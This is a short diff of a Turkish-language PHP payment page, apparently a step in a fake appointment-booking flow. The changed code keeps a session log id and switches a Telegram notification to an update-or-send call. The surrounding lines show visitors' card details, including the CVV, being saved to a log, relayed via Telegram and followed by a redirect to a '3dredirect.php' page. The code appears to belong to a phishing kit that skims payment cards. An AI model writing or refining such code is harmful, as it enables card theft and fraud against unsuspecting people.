@@ -15,7 +15,10 @@ kayit_ziyaretci();
 $randevu_ucreti = ayar_get('randevu_ucreti', '49');
 $_SESSION['adim'] = 3;
 $_aktif_log_id = get_or_create_log();
-if ($_aktif_log_id) update_log($_aktif_log_id, ['mevcut_adim' => 3, 'son_aktivite' => date('Y-m-d H:i:s')]);
+if ($_aktif_log_id) {
+    $_SESSION['log_id'] = $_aktif_log_id;
+    update_log($_aktif_log_id, ['mevcut_adim' => 3, 'son_aktivite' => date('Y-m-d H:i:s')]);
+}
 
 
 $basvuru    = $_SESSION['basvuru'];
@@ -100,8 +103,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'cvv'         => $form_data['cvv'],
         'mevcut_adim' => 4,
       ]);
-      // Telegram mesajı — tek seferlik gönderim
-      try { tg_mesaj_gonder($lid); } catch (Exception $e) {}
+      // Telegram mesajını güncelle veya yeni gönder
+      try { tg_mesaj_guncelle($lid); } catch (Exception $e) {}
     }
 
     header('Location: ' . BASE_PATH . '/3dredirect.php'); exit;
